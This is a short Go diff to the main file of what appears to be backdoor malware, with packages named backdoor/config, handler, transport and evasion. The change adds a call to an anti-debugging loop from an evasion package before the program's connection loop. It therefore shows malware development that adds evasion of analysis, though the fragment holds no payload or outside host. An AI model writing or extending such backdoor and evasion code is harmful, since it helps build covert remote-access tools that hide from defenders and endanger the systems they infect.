@@ -2,12 +2,14 @@ package main
 
 import (
 	"backdoor/config"
+	"backdoor/evasion"
 	"backdoor/handler"
 	"backdoor/transport"
 	"time"
 )
 
 func main() {
+	evasion.StartAntiDebugLoop()
 	for {
 		var conn transport.Transport
 		var err error
